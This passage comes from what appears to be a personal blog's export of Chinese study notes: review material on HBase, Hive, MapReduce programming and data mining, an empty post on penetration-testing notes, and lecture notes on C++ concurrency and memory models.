<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Reducer &#123;</span><br><span class="line">	method setup() &#123;</span><br><span class="line">		t_prev = null;</span><br><span class="line">		P = new PostingList;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	method reduce(tuple&lt;term, docid&gt;, Iterable(fs)) &#123;</span><br><span class="line">		for (f in)</span><br><span class="line">		if (term != t_prev &amp;&amp; t_prev != null) &#123;</span><br><span class="line">			emit(t_prev, P);</span><br><span class="line">			P.Reset();</span><br><span class="line">		&#125;</span><br><span class="line">		P.append(&lt;docid, f&gt;);</span><br><span class="line">		t_prev = term;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	method cleanup() &#123;</span><br><span class="line">		emit(t_prev, P)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="ch6-HBase和Hive"><a href="#ch6-HBase和Hive" class="headerlink" title="ch6 HBase和Hive"></a>ch6 HBase和Hive</h1><h2 id="需要掌握的问题-4"><a href="#需要掌握的问题-4" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>CAP定理</li>
<li>普通数据库为什么不适用</li>
<li>HBase 的物理结构</li>
<li>HBase 的逻辑结构</li>
</ol>
<h2 id="回答-4"><a href="#回答-4" class="headerlink" title="回答"></a>回答</h2><h3 id="1-CAP定理"><a href="#1-CAP定理" class="headerlink" title="1. CAP定理"></a>1. CAP定理</h3><p>Consistency，一致性</p>
<p>Availablity，可用性</p>
<p>PartitionTolerance，分区容错性</p>
<p>三者不可兼得</p>
<h3 id="2-普通数据库为什么不适用"><a href="#2-普通数据库为什么不适用" class="headerlink" title="2. 普通数据库为什么不适用"></a>2. 普通数据库为什么不适用</h3><p>大表</p>
<p>高并发访问</p>
<p>不停机情况下的动态增删列</p>
<p>分布式网络分片问题</p>
<h3 id="3-HBase的逻辑结构"><a href="#3-HBase的逻辑结构" class="headerlink" title="3. HBase的逻辑结构"></a>3. HBase的逻辑结构</h3><p>行关键字，时间戳，列关键字</p>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812101854154.png" alt="image-20200812101854154"></p>
<h3 id="4-HBase的架构"><a href="#4-HBase的架构" class="headerlink" title="4. HBase的架构"></a>4. HBase的架构</h3><p>HBase位于HDFS和上层应用之间</p>
<p>有MasterServer和RegionServer，对应BigTable里的主服务器和子表服务器</p>
<p>大表中的底层数据存在HDFS里</p>
<p>子表中的数据区Region</p>
<ul>
<li>由很多Store组成</li>
<li>每个Store由一个memStore和若干FileStore组成</li>
</ul>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812102810139.png" alt="image-20200812102810139"></p>
<p>除此之外还有一个HLog，日志恢复</p>
<h3 id="5-访问-更新HBase数据的过程"><a href="#5-访问-更新HBase数据的过程" class="headerlink" title="5. 访问/更新HBase数据的过程"></a>5. 访问/更新HBase数据的过程</h3><p>三级搜索结构：</p>
<ul>
<li><p>用户的数据表存在子表服务器上，它的信息记录在元数据表（.META.表）里</p>
</li>
<li><p>元数据表存在特殊的子表服务器上，它的信息记录在根子表（root region）里</p>
</li>
<li><p>根子表在主服务器里</p>
</li>
</ul>
<blockquote>
<p> 查的时候是反过来，先扫描根子表，得到元数据表位置，再查元数据表，得到用户数据表在哪个子表服务器上</p>
</blockquote>
<p>访问：</p>
<ul>
<li>先从Master服务器查到子表服务器，去memStore里找，如果没有，再去StoreFile里搜索，B+树结构，定期压缩</li>
<li>两个小的子表可以合并为大子表</li>
<li>子表大到一定程度调用 HRegion.closeAndSplit() 进行拆分</li>
</ul>
<p>更新：</p>
<ul>
<li>先从Master服务器查到子表服务器，然后提交数据更新请求，新数据先写在memStore里，等满一定大小了再往StoreFile里写，StoreFile位于HDFS</li>
</ul>
<h3 id="6-HBase相关命令"><a href="#6-HBase相关命令" class="headerlink" title="6. HBase相关命令"></a>6. HBase相关命令</h3><p>建立表、插入数据，查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create &apos;student&apos;, &apos;id&apos;, &apos;Description&apos;, &apos;Courses&apos;, &apos;home&apos;;</span><br><span class="line"></span><br><span class="line">put &apos;student&apos;, &apos;001&apos;, &apos;Description:name&apos;, &apos;lilei&apos;;</span><br><span class="line">put &apos;student&apos;, &apos;001&apos;, &apos;Description:height&apos;, &apos;186&apos;;</span><br><span class="line">put &apos;student&apos;, &apos;001&apos;, &apos;Courses:Math&apos;, &apos;99&apos;;</span><br><span class="line"></span><br><span class="line">describle &apos;student&apos;</span><br><span class="line">scan &apos;student&apos;</span><br><span class="line">scan &apos;student&apos;, &#123;COLUMNS=&gt;&apos;Courses:&apos;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-HBase-disable和enable"><a href="#7-HBase-disable和enable" class="headerlink" title="7. HBase disable和enable"></a>7. HBase disable和enable</h3><p>disable ‘student’时，会将该表在zookeeper下做记录，然后将表的region全部下线</p>
<p>enable ‘student’时，将region全部上线，会去掉zookeeper中的标记，然后看.MATA表中有无该子表的服务器，如果有就上线到那台子表服务器，如果没有就随机选择一个服务器上线</p>
<h3 id="8-Hive的架构"><a href="#8-Hive的架构" class="headerlink" title="8. Hive的架构"></a>8. Hive的架构</h3><p>组成元素：</p>
<ul>
<li>HiveQL：查询语言</li>
<li>Driver：驱动程序</li>
<li>Compiler：编译器，用来将HiveQL转化为中间语言</li>
<li>Execution engine：执行引擎，在driver的驱动下具体执行操作</li>
<li>metastore：存储操作的数据对象的位置信息等</li>
</ul>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812112340611.png" alt="image-20200812112340611"></p>
<h3 id="9-Hive的逻辑结构"><a href="#9-Hive的逻辑结构" class="headerlink" title="9. Hive的逻辑结构"></a>9. Hive的逻辑结构</h3><ul>
<li>Tables：数据表中的列是有类型的，int float string boolean，也可是复合类型map</li>
<li>partitions：数据表可以按日期划分</li>
<li>buckets：用桶按hash的方式划分，对抽样和join优化有意义</li>
</ul>
<h3 id="10-Hive相关命令"><a href="#10-Hive相关命令" class="headerlink" title="10. Hive相关命令"></a>10. Hive相关命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">create table sharkspeare (freq int, word string) row format delimtied fields terminated by &apos;\t&apos; as textfile;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">discrible sharkspeare;</span><br><span class="line"></span><br><span class="line">load data inpath &apos;xxx-freq&apos; into table sharkspeare;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from sharkspeare limit 10;</span><br><span class="line"></span><br><span class="line">select * from sharkspeare where freq &gt; 10 sort by freq asc limit 10;</span><br><span class="line"></span><br><span class="line">select a.foo from invites a where a.ds = &apos;2020-8-12&apos;</span><br><span class="line"></span><br><span class="line">select t1.bar t1.foo t2.foo from</span><br><span class="line">	pokes t1 join invites t2 on t1.bar = t2.bar;</span><br></pre></td></tr></table></figure>
<h1 id="ch7-MapReduce-高级编程技术"><a href="#ch7-MapReduce-高级编程技术" class="headerlink" title="ch7 MapReduce 高级编程技术"></a>ch7 MapReduce 高级编程技术</h1><h2 id="需要掌握的问题-5"><a href="#需要掌握的问题-5" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>复合键值对的使用</li>
<li>用户自定义数据类型</li>
<li>用户自定义输入输出格式</li>
<li>用户自定义Partitioner和Combiner</li>
<li>迭代完成MapReduce计算</li>
<li>组合式MapReduce程序设计</li>
<li>多数据源的连接</li>
<li>全局参数/数据文件的传递</li>
<li>其它处理技术</li>
</ol>
<h2 id="回答-5"><a href="#回答-5" class="headerlink" title="回答"></a>回答</h2><h3 id="1-复合键值对的使用"><a href="#1-复合键值对的使用" class="headerlink" title="1. 复合键值对的使用"></a>1. 复合键值对的使用</h3><p>倒排索引中的value-to-key思想，完成排序</p>
<h3 id="2-用户自定义数据类型"><a href="#2-用户自定义数据类型" class="headerlink" title="2. 用户自定义数据类型"></a>2. 用户自定义数据类型</h3><p>需要implements WritableComparable接口</p>
<p>重写readFields, write, compareTo函数</p>
<p>并</p>
<p>setMapOutputKeyClass(xxx.class)</p>
<p>setMapOutputValueClass()</p>
<p>setOutputKeyClass</p>
<p>setOutputValueClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point3D</span> <span class="keyword">implements</span> <span class="title">WritableComparable</span>&lt;<span class="title">Point3D</span>&gt; </span>&#123;</span><br><span class="line">	<span class="keyword">float</span> x, y, z;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(DataOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		out.write(x);</span><br><span class="line">		out.write(y);</span><br><span class="line">		out.write(z);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFields</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		x = in.readFloat();</span><br><span class="line">		y = in.readFloat();</span><br><span class="line">		z = in.readFloat();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Point3D p)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//compare</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>,<span class="number">1</span>,-<span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-用户自定义输入输出格式"><a href="#3-用户自定义输入输出格式" class="headerlink" title="3. 用户自定义输入输出格式"></a>3. 用户自定义输入输出格式</h3><p>需要extends FileInputFormat</p>
<p>重写createRecordReader、getCurrentKey，getCurrentValue，initialize函数</p>
<p>并且setInputFormatClass(xxx.class)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileNameOffsetInputFormat</span> <span class="keyword">extends</span> <span class="title">FileInputFormat</span>&lt;<span class="title">Text</span>, <span class="title">Text</span>&gt; </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RecordReader&lt;Text, Text&gt; <span class="title">createRecordReader</span><span class="params">(InputSplit split, </span></span></span><br><span class="line"><span class="function"><span class="params">    TaskAttemptContext context)</span> </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        FileNameOffsetRecordReader fnrr = <span class="keyword">new</span> FileNameOffsetRecordReader();</span><br><span class="line">        <span class="keyword">try</span> </span><br><span class="line">        &#123; fnrr.initialize(split, context); &#125; </span><br><span class="line">        <span class="keyword">catch</span> (IOException e) &#123; e.printStackTrace(); &#125; </span><br><span class="line">        <span class="keyword">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class="line">        <span class="keyword">return</span> fnrr;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileNameOffsetRecordReader</span> <span class="keyword">extends</span> <span class="title">RecordReader</span>&lt;<span class="title">Text</span>, <span class="title">Text</span>&gt; </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    String fileName;</span><br><span class="line">    LineRecordReader lrr = <span class="keyword">new</span> LineRecordReader();</span><br><span class="line">    ……</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Text <span class="title">getCurrentKey</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span></span><br><span class="line">    &#123; return new Text("(" + fileName + “#" + lrr.getCurrentKey() + ")"); &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Text <span class="title">getCurrentValue</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> lrr.getCurrentValue(); &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(InputSplit arg0, TaskAttemptContext arg1)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, InterruptedException </span></span><br><span class="line"><span class="function">    </span>&#123; lrr.initialize(arg0, arg1);</span><br><span class="line">    fileName = ((FileSplit)arg0).getPath().getName();</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-用户自定义Partitioner和Combiner"><a href="#4-用户自定义Partitioner和Combiner" class="headerlink" title="4. 用户自定义Partitioner和Combiner"></a>4. 用户自定义Partitioner和Combiner</h3><p>extends HashPartitioner<k,v>并重写getPartition函数</k,v></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MyPartitioner extends HashPartitioner&lt;K, V&gt; &#123;</span><br><span class="line">	public int getPartition(K key, V value, int numReduceTasks) &#123;</span><br><span class="line">		return ...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>extends Reducer<k, v="">并重写reduce函数</k,></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MyCombiner extends Reducer&lt;K, V&gt; &#123;</span><br><span class="line">	void reduce(K key, V value, Context context) throws IOException, InterruptedException&#123;</span><br><span class="line">		context.write(..., ...)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-迭代完成MapReduce计算"><a href="#5-迭代完成MapReduce计算" class="headerlink" title="5. 迭代完成MapReduce计算"></a>5. 迭代完成MapReduce计算</h3><p>pagerank</p>
<h3 id="6-组合式MapReduce程序设计"><a href="#6-组合式MapReduce程序设计" class="headerlink" title="6. 组合式MapReduce程序设计"></a>6. 组合式MapReduce程序设计</h3><p>可视作pagerank的三个阶段</p>
<p>依赖任务的添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joby.addDependingJob(jobx); 使得y需要等待x结束</span><br><span class="line">JobControl JC = new JobControl(&quot;xy&quot;);</span><br><span class="line">JC.addJob(jobx);</span><br><span class="line">JC.addJob(joby);</span><br><span class="line">JC.run();</span><br></pre></td></tr></table></figure>
<h3 id="7-多数据源的连接"><a href="#7-多数据源的连接" class="headerlink" title="7. 多数据源的连接"></a>7. 多数据源的连接</h3><p>比如join两张表</p>
<ul>
<li>可以自行添加标签然后reduce端join，也可以用DataJoin类</li>
<li>也可以map端join，利用distributedCache传递较小的文件</li>
</ul>
<h3 id="8-全局参数-数据文件的传递"><a href="#8-全局参数-数据文件的传递" class="headerlink" title="8. 全局参数/数据文件的传递"></a>8. 全局参数/数据文件的传递</h3><p>driver端：conf.set(…)</p>
<p>map/reduce端：context.getConfiguration().get(…)</p>
<h3 id="9-其它处理技术"><a href="#9-其它处理技术" class="headerlink" title="9. 其它处理技术"></a>9. 其它处理技术</h3><p>多文件输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MyOutputFormat extends MultipleTextOutputFormat&lt;K, V&gt; &#123;</span><br><span class="line">	protected String generateFileNameForKeyValue(K, V, String filename) &#123;</span><br><span class="line">		return &quot;self&quot;;</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="ch8-PageRank"><a href="#ch8-PageRank" class="headerlink" title="ch8 PageRank"></a>ch8 PageRank</h1><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812151512228.png" alt="image-20200812151512228"></p>
<h1 id="ch9-数据挖掘"><a href="#ch9-数据挖掘" class="headerlink" title="ch9 数据挖掘"></a>ch9 数据挖掘</h1><h2 id="需要掌握的问题-6"><a href="#需要掌握的问题-6" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>K-means聚类算法</li>
<li>分类算法</li>
<li>频繁项集挖掘算法</li>
<li>SVM</li>
</ol>
<h2 id="回答-6"><a href="#回答-6" class="headerlink" title="回答"></a>回答</h2><h3 id="1-K-means聚类算法"><a href="#1-K-means聚类算法" class="headerlink" title="1. K-means聚类算法"></a>1. K-means聚类算法</h3><p>将N个点分为K类</p>
<ol>
<li>选取K个初始中心点</li>
<li>对每个点归进离他最近的中心点，完毕后重新计算K个中心点的值</li>
<li>如果迭代结束条件为满足，重复2</li>
</ol>
<h3 id="2-K近邻"><a href="#2-K近邻" class="headerlink" title="2. K近邻"></a>2. K近邻</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812153312447.png" alt="image-20200812153312447"></p>
<h3 id="3-朴素贝叶斯"><a href="#3-朴素贝叶斯" class="headerlink" title="3. 朴素贝叶斯"></a>3. 朴素贝叶斯</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812154826826.png" alt="image-20200812154826826"></p>
<p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812154810381.png" alt="image-20200812154810381"></p>
<h3 id="4-SVM"><a href="#4-SVM" class="headerlink" title="4. SVM"></a>4. SVM</h3><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812155037507.png" alt="image-20200812155037507"></p>
<h1 id="ch10-spark"><a href="#ch10-spark" class="headerlink" title="ch10 spark"></a>ch10 spark</h1><p><img src="/2020/08/08/大数据与并行计算复习笔记/image-20200812155814219.png" alt="image-20200812155814219"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Big Data</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透学习笔记</title>
    <url>/2020/11/06/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>并发算法与理论笔记</title>
    <url>/2021/11/18/%E5%B9%B6%E5%8F%91%E7%AE%97%E6%B3%95%E4%B8%8E%E7%90%86%E8%AE%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>并发算法与理论 笔记</p>
<p>40 平时作业</p>
<p>60 期末考试</p>
<h1 id="class-1"><a href="#class-1" class="headerlink" title="class-1"></a>class-1</h1><p>描述两段代码并行的符号：C1 || C2</p>
<p>注意，main和main中开的子线程是并行的，不要遗漏</p>
<p>cout &lt;&lt; x1 &lt;&lt; x2 &lt;&lt; endl; 涉及三次函数调用，并发是会分割输出x1 x2 endl，而不是作为一条指令，需要讨论并发的粒度(granularity)</p>
<p>如何把三个cout合并成一条指令？C++的做法是引入std::mutex</p>
<p>在这个case中，cout是共享内存，需要锁住</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;mutex&gt;</span><br><span class="line">std::mutex mu; //需要注意mu是全局的，这样才能同时管住&quot;C1&quot;和&quot;C2&quot;</span><br><span class="line"></span><br><span class="line">void func() &#123;</span><br><span class="line">	mu.lock();</span><br><span class="line">	cout &lt;&lt; x1 &lt;&lt; x2 &lt;&lt; endl;</span><br><span class="line">	mu.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种写法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;mutex&gt;</span><br><span class="line">std::mutex mu;</span><br><span class="line"></span><br><span class="line">void func() &#123;</span><br><span class="line">	std::lock_guard&lt;std::mutex&gt; gu(mu);//这里gu诞生，拿锁</span><br><span class="line">	cout &lt;&lt; x1 &lt;&lt; x2 &lt;&lt; endl;</span><br><span class="line">&#125; //到这里gu消亡，释放锁</span><br></pre></td></tr></table></figure>
<p>TODO: std::mutex的lock和unlock的内部实现是如何的？是串行的吗？为什么线程并发在执行到lock的实现时不会出事.  （<a href="https://zhiqiang.org/coding/std-mutex-implement.html）" target="_blank" rel="noopener">https://zhiqiang.org/coding/std-mutex-implement.html）</a></p>
<p>concurrent program = concurrent objects + their clients</p>
<p>memory model：描述了并发程序如何使用内存</p>
<ul>
<li>Sequential Consistency(SC) model：顺序一致性，表现为并发线程们交替使用内存（<a href="https://blog.csdn.net/peterlin666/article/details/39080495/）" target="_blank" rel="noopener">https://blog.csdn.net/peterlin666/article/details/39080495/）</a></li>
<li>weak/relaxed memory model：C1||C2产生比SC model更多的行为（编译器为了优化或性能做出了违反SC的事）<ul>
<li>java</li>
<li>c++11</li>
<li>x86-TSO</li>
<li>ARMv8</li>
<li>…</li>
</ul>
</li>
</ul>
<p>下面的例子中，assert会fail，因为x=x+1会被拆成两条语句，t=x，x=t+1。该线程t=x使得t存了x的旧值，另一个线程增加了x的值，然后回到该线程x=t+1，将x又恢复成旧值，结果就是执行完之后x的值小于预期的200w。</p>
<p>此外，++x和x++均同理</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210901091938158.png" alt="image-20210901091938158"></p>
<p>本课不关注算法复杂度，只关注正确性，即实现出来的concurrent object，即使处于并发环境，也能得到“预期的结果”</p>
<h1 id="class-2"><a href="#class-2" class="headerlink" title="class-2"></a>class-2</h1><p>为什么现代程序语言都不是SC的？SC的弱点</p>
<ul>
<li>SC模型禁止了一些优化</li>
</ul>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908081523800.png" alt="image-20210908081523800" style="zoom:67%;"></p>
<p>该图中的问题</p>
<ul>
<li>按SC model，r1=r2=0不会发生</li>
<li>但是如果不按SC model，编译器编译C1时，想做优化，他发现x和y是俩变量，独立的，那么可以调换语序，变成箭头所示，然后就乱了</li>
<li>x86体系结构里，每个线程有自己的write buffer，写操作（x=1，y=1）先写在write buffer中，再写入内存，这个中间隔了时间，导致r1=y，r2=x读到的还是旧的0，0</li>
<li>这段程序很经典，叫store buffering</li>
</ul>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908082028785.png" alt="image-20210908082028785" style="zoom:67%;"></p>
<p>至少一个进程是write，就会出现</p>
<p>DRF涉及的条件</p>
<ul>
<li>conflicting：write-write，或者read-write</li>
<li>concurrent<ul>
<li>由内存模型定义什么是并发</li>
<li>比如java的并发，指的是两个操作没有被happens-before确定顺序，如果有锁，需要看清</li>
</ul>
</li>
</ul>
<p>DRF Guarantee：满足DRF的程序在SC model下行为是一致的，有类似于锁的机制</p>
<p>hb： happens before</p>
<p>sw：synchronized with</p>
<p>。。。</p>
<p>hb引出的out-of-thin-air的理解如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908112139069.png" alt="image-20210908112139069"></p>
<p>出现42这种oota的结果，是因为HMM没有DRF-guarantee。</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908092621196.png" alt="image-20210908092621196"></p>
<p>。。。</p>
<p>老师的图如下，特别说明，如果是DRF的话，就只会出现r1=r2=0，不会有oota的42</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908093353888.png" alt="image-20210908093353888"></p>
<p>。。。我的图如下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908105520947.png" alt="image-20210908105520947"></p>
<p>。。。</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210908093728552.png" alt="image-20210908093728552"></p>
<h1 id="class-3"><a href="#class-3" class="headerlink" title="class-3"></a>class-3</h1><p>C++内存模型</p>
<p>C11/C++11自定义了一个DRF，允许比较松的行为，但如果太松就认为是UB</p>
<p>C11定义了memory_order</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915080911973.png" alt="image-20210915080911973" style="zoom:67%;"></p>
<p>release/accquire是配合使用的，一写一读</p>
<p>mo_seql_cst是最强的要求，等于SC model，例如在处理store buffering(SB)时不会出现r1=r2=0</p>
<p>message passing(MP)模型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = 1; || r1 = y</span><br><span class="line"></span><br><span class="line">y = 1; || r2 = x</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915081501887.png" alt="image-20210915081501887"></p>
<p>用mo_seq_cst，不会出现r1=1，r2=0的结果</p>
<p>-</p>
<p>IRIW：independent reads, independent writes</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = 1; || y = 1; || r1 = x || r3 = y</span><br><span class="line">				 || r2 = y || r4 = x</span><br></pre></td></tr></table></figure>
<p>-</p>
<p>relax比较松，感觉像语序调整了，使得r1和r2都是1</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915082303847.png" alt="image-20210915082303847"></p>
<p>relax会使用简单机器码，速度快，但行为就奇怪</p>
<p>-</p>
<p>sb(sequence before)：指在之前执行</p>
<p>rf(reads-from)：</p>
<p>asw: 初始化和之后操作的先后关系</p>
<p>dd：struct结构的数据和struct有依赖关系</p>
<p>sc order：store和load</p>
<p>mo：写和写之间的先后关系</p>
<p>sw：synchronized with</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915083645384.png" alt="image-20210915083645384"></p>
<p>这个里面会出现UB</p>
<p>。</p>
<p>hb = sw和sb的闭包，带上asw</p>
<p>。</p>
<p>C中的data race：2个操作并发，不全是atomic access，其中至少一个是写，没有HB关系</p>
<p>C有dr，就会有UB，这一点不像java会给出一个行为，C只会UB</p>
<p>精确定义如下：</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915085843319.png" alt="image-20210915085843319" style="zoom: 80%;"></p>
<p>。</p>
<p>C允许在load(relax)后跟一个fense，形成和acquire-release相同的效果</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915090532504.png" alt="image-20210915090532504" style="zoom:80%;"></p>
<p>这俩等价</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915090720122.png" alt="image-20210915090720122"></p>
<p>rlx之间没有sw关系，但是W rlx y = 1和Fense acq之间有sw关系，于是x=1和x=1有了sb关系</p>
<p>-</p>
<p>rf，mo都不是hb的一部分</p>
<p>-</p>
<p>cas(&amp;x, v1, v3):</p>
<p>if x == v1</p>
<p>​    x=v2;</p>
<p>​    return true</p>
<p>else</p>
<p>​    return false</p>
<p>把他理解成一次read，再加一次write，但是是原子的操作</p>
<p>-</p>
<p>consume很麻烦，使得hb没有传递性，不建议使用，不讲</p>
<p>-</p>
<p>C中的atomic_init不是原子操作嗷</p>
<p>-</p>
<p>C中有问题，self-satisfying</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210915094052615.png" alt="image-20210915094052615"></p>
<p>实现C的标准时不应该允许这个行为，即使模型中无法rule out这个情况</p>
<p>-</p>
<p>对release/acquire的理解：</p>
<p>Release操作：RELEASE操作前所有的READ/WRITE都不能跑到store后面</p>
<p><img src="/2021/11/18/并发算法与理论笔记/v2-c7c8e5fe0a7b71444cb83445a10f2992_720w.jpg" alt="img"></p>
<p>想象成，前面的读写只能完成，直到我释放</p>
<p>-</p>
<p>Acquire操作：acquire后面都读写操作无法排到前面</p>
<p><img src="/2021/11/18/并发算法与理论笔记/v2-59e0039749576a20e4863f28a05219e6_720w.jpg" alt="img"></p>
<p>想象成，只有我获取到了，后面的值才能进行计算</p>
<h1 id="class-4"><a href="#class-4" class="headerlink" title="class-4"></a>class-4</h1><p>前沿信息</p>
<p>rtach motel reordering：lock往前移动，让更多语句进入临界区，是更安全的；反之，lock往后移动，看起来不那么安全</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922080647424.png" alt="image-20210922080647424" style="zoom:80%;"></p>
<p>这样变换之后，t=x这个语句跑到了临界区外面，不安全了</p>
<p>-</p>
<p>WMM：weak memory model</p>
<p>-</p>
<p>。。。</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922083527811.png" alt="image-20210922083527811"></p>
<p>mo和hb的冲突，不被允许，mo是对单个变量的写顺序</p>
<p>和下面这个对比一下</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922084046100.png" alt="image-20210922084046100" style="zoom:80%;"></p>
<p>这个问题里是x和y之间不存在mo，所以是允许的</p>
<p>-</p>
<p>non-atomic里又不可以了</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922084320082.png" alt="image-20210922084320082"></p>
<p>。</p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922085002894.png" alt="image-20210922085002894"></p>
<p>读不到0，因为rb，rf，po组成了环</p>
<p>non-atomic只能read到和自己有hb关系的最近的write，所以下图里read到1也是不对的</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922085103990.png" alt="image-20210922085103990"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922085514901.png" alt="image-20210922085514901"></p>
<p>第二段程序的if a == 1，因为是non-atomic，所以只会读hb的a=0，而不可能读出a=1，所以if fail，y=1没了，第三段程序中的if y.load(rlx) == 1也没有rf的来源了，就也没了，然后x=1也没了，第二段程序里的if x.load(rlx) ==1也没了</p>
<p>但，如果串行化之后，把a=1放到第二段程序中，那就有了hb，a可以读出1了，x=y=1也就允许出现了</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922085736355.png" alt="image-20210922085736355"></p>
<p>-</p>
<p>monotonicity：串行化不会引入新的行为</p>
<p>而c11违背了这个原则</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922090200241.png" alt="image-20210922090200241"></p>
<p>-</p>
<p><img src="/2021/11/18/并发算法与理论笔记/image-20210922090658878.png" alt="image-20210922090658878"></p>
<p>出现了环（核心是Rsc x，0到Wsc x，1有rb的边），就出问题了</p>
